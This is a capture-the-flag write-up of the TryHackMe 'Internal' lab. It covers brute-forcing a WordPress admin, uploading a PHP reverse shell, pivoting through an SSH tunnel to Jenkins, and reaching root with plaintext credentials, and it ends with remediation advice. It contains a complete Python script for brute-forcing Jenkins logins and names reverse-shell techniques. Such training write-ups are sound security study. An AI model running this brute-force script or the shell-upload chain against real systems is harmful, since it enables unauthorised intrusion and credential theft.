# Write-up: -Internal- Try Hack Me By Mohammed-Ali Member of CyberScope Team  🚩
**Category:** black box penetration test
**Level:** Hard
---
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.
---
<img width="1277" height="798" alt="1" src="https://github.com/user-attachments/assets/5c8babb4-2e0b-430c-98f5-16abdb22f6fd" />

## Reconnaissance & Enumeration
---

target ip : 10.112.146.197 
---

### i used nmap to identify open ports and services:

<img width="770" height="315" alt="2" src="https://github.com/user-attachments/assets/6db7c65f-1b08-4134-ae40-dbcc9a5c8f88" />

```python
Result:

Port 22 → SSH  (OpenSSH 7.6p1 Ubuntu)
Port 80 → HTTP (Apache 2.4.29)
```

## Web Enumeration: 
I checked the HTTP service and confirmed that a website is running, locating the default Apache welcome page.

<img width="1917" height="999" alt="3" src="https://github.com/user-attachments/assets/38f16832-99c3-455b-ac1a-9737486be114" />

### I attempted to enumerate hidden directories using Gobuster, which revealed the existence of 

<img width="1281" height="442" alt="5" src="https://github.com/user-attachments/assets/8f3e0cc9-dcbd-447a-9c40-e9b523a4e328" />

```python
Result:
blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
index.html           (Status: 200) [Size: 10918]
javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
```
#### Upon investigation, I identified that the website utilizes WordPress under the /blog directory, and I also located a login page.

<img width="1553" height="996" alt="6" src="https://github.com/user-attachments/assets/5f49dcf3-4ee3-4aa0-bef8-22a8e3a53439" />

### WordPress Enumeration & Brute-Forcing

##### Since a login page was available, I attempted to log in using 'admin' as the username. The application returned an error message indicating an incorrect password, which confirmed the existence of the 'admin' user. Consequently, I utilized WPScan to brute-force the password and identify the valid credentials

<img width="1465" height="906" alt="7" src="https://github.com/user-attachments/assets/0288b42b-0c1b-44d6-a947-d7e9b8c44cf8" />

#### Result 
```python
Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <======================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                          
Trying admin / bratz1 Time: 00:02:40 <                                      > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```
```
After finding the password, I logged into the WordPress dashboard and looked for a place to upload a reverse shell. I successfully located an upload mechanism to deploy it.
```
<img width="1916" height="998" alt="8" src="https://github.com/user-attachments/assets/cdf2fac2-8b04-4bd4-a094-dc70e6f18ac1" />

<img width="1916" height="995" alt="9" src="https://github.com/user-attachments/assets/d835c89e-5c1d-411c-ae40-24ee12d21d00" />

#### I used revshells.com to obtain a pentestmonkey PHP reverse shell. After uploading the payload, I established a Netcat listener to catch the shell prior to execution.

<img width="1242" height="793" alt="gemini-code-1779077919149" src="https://github.com/user-attachments/assets/1efaff93-8250-4a7e-9a33-9fc232695546" />

## Post-Exploitation / Privilege Escalation 

Upon further post-exploitation reconnaissance, I enumerated the /opt directory and discovered a text file named wp-save.txt. Reading the file revealed sensitive credentials (aubreanna:bubb13guM!@#123) intended for another user. Suspecting these credentials might be valid for SSH access, I attempted an SSH connection, which successfully granted me access to the system as the user aubreanna. From there, I was able to retrieve the user.txt flag

```python
 ls
ls
containerd
wp-save.txt
www-data@internal:/opt$ cat wp
cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```
### Internal Network Enumeration

After establishing a stable SSH session as the user `aubreanna`, I continued enumerating the system for internal services and potential pivot points. During this process, I discovered a file named `jenkins.txt` in the user's environment. 

The file contained the following details:
> **Internal Jenkins service is running on 172.17.0.2:8080**

This confirmed that an internal Jenkins server is running within an isolated subnet (`172.17.0.0/24` or a Docker bridge network), which is not directly accessible from the external network. This service represents the next target for lateral movement and further enumeration.

To access the isolated Jenkins service, I established an SSH local port forwarding tunnel using the following command: ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm. This allowed me to map the remote internal service to my local machine on port 8080.

Upon inspecting the forwarded port, I discovered a web interface hosting a Jenkins login page. While public documentation suggests that 'admin' is often a default username, the default setup requires a specific initial password. Rather than utilizing Metasploit, I deployed a customized automated script to brute-force the login interface and discover the valid credentials

<img width="1918" height="997" alt="11" src="https://github.com/user-attachments/assets/c0d5f3e5-caa3-4e4d-b640-b6ad0d8108ed" />

``` python 
the script is used it to find the password:

import requests
import sys

target_url = "http://127.0.0.1:8080/j_acegi_security_check"
username = "admin"


wordlist_path = "/home/rootforce/Desktop/all/cyber_security/SecLists-master/rockyou.txt"

print(f"[*] Starting accurate brute force against Jenkins...")
print(f"[*] Target Username: {username}")
print(f"[*] Using Wordlist: {wordlist_path}")

session = requests.Session()

try:
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
        for line in wordlist:
            password = line.strip()
            if not password:
                continue
                
            payload = {
                'j_username': username,
                'j_password': password,
                'from': '/',
                'Submit': ''
            }
            

            response = session.post(target_url, data=payload, allow_redirects=True)
            

            if "loginError" in response.url or "Invalid username" in response.text:
                print(f"[-] Trying: {password}", end='\r')
            else:

                print(f"\n[+] SUCCESS! Password found: {password}")
                print(f"[+] Final URL: {response.url}")
                sys.exit(0)
                
except FileNotFoundError:
    print(f"\n[!] Error: Wordlist not found at {wordlist_path}")
    print("[*] Please verify if 'Passwords/Common-Credentials/common-passwords.txt' exists in your SecLists folder.")
except KeyboardInterrupt:
    print("\n[!] Process interrupted by user.")

print("\n[-] Password not found in the provided wordlist.")
```

 ```php
result :

python3 exploit.py                                                   2351ms
[*] Starting accurate brute force against Jenkins...
[*] Target Username: admin
[*] Using Wordlist: /home/rootforce/Desktop/all/cyber_security/SecLists-master/rockyou.txt
[-] Trying: sweetyar1l
[+] SUCCESS! Password found: spongebob
[+] Final URL: http://127.0.0.1:8080/
```
after login 

<img width="1917" height="926" alt="13" src="https://github.com/user-attachments/assets/cf0ef77f-64fe-4810-b880-c0537be9ec39" />

After successfully authenticating into the Jenkins dashboard, I navigated to the Script Console, which allows the execution of Groovy scripts. I utilized revshells.com to generate a compatible Groovy reverse shell payload. After executing the script, my Netcat listener captured the incoming connection, granting me a shell inside the Jenkins container.

During local post-exploitation reconnaissance within the container, I enumerated the /opt directory and located a file named note.txt. Upon inspecting its contents, I discovered the root password, completing the final phase of the compromise.

<img width="1919" height="924" alt="15" src="https://github.com/user-attachments/assets/3a1ce0fc-1f43-4d40-8dc2-fa693f315582" />

<img width="1917" height="929" alt="16" src="https://github.com/user-attachments/assets/06c2cb33-7e4e-4239-9eb0-38185e515edd" />

### The Netcat connect :

<img width="819" height="377" alt="18" src="https://github.com/user-attachments/assets/a2251265-080f-43f7-bbf5-6c9cb1320f86" />

```php
/opt/note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```
#### Finally, I established an SSH connection using the recovered root credentials, successfully gaining full root access and fully compromising the target (Pwned)

## Vulnerabilities Identified & Remediation
1. Username Enumeration via Login Error Messages

    Severity: Low

    Description: The WordPress login interface responds with specific error messages that distinguish between an invalid username and an incorrect password. This allowed the attacker to confirm the existence of the admin user.

    Remediation: Configure login error messages to be generic (e.g., "Invalid username or password").

2. Weak Administrative Credentials & Lack of Rate Limiting

    Severity: High

    Description: The administrative accounts (WordPress & Jenkins) utilized weak, predictable passwords that were susceptible to automated brute-force attacks (WPScan and custom scripts). Additionally, there was no rate-limiting or account lockout policy in place to prevent these attacks.

    Remediation: Enforce strong password policies and implement multi-factor authentication (MFA) along with rate-limiting solutions (like Fail2ban).

3. Arbitrary File Upload via WordPress Dashboard

    Severity: Critical

    Description: Once authenticated, the WordPress platform allowed the upload or modification of executable PHP scripts (Reverse Shell), leading to Remote Code Execution (RCE) under the context of the www-data user.

    Remediation: Restrict the file upload capabilities, disable the built-in file editor (DISALLOW_FILE_EDIT in wp-config.php), and ensure the web server runs with minimal permissions.

4. Hardcoded Credentials in Plaintext Files

    Severity: Critical

    Description: Sensitive credentials (aubreanna's SSH password and the root password) were stored in plaintext inside accessible files (/opt/wp-save.txt and /opt/note.txt). This allowed horizontal and vertical privilege escalation.

    Remediation: Never store credentials in plaintext. Use secure credential managers or environment variables with strict file permissions (e.g., chmod 600).

5. Insecure Groovy Script Console Access (Jenkins)

    Severity: High

    Description: The Jenkins administrative dashboard exposed the Groovy Script Console, which inherently allows system administrators to run arbitrary Java code on the host instance, enabling an attacker to execute a reverse shell.

    Remediation: Restrict access to the Jenkins dashboard using strong authentication, network isolation, and role-based access control (RBAC).

   
### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon
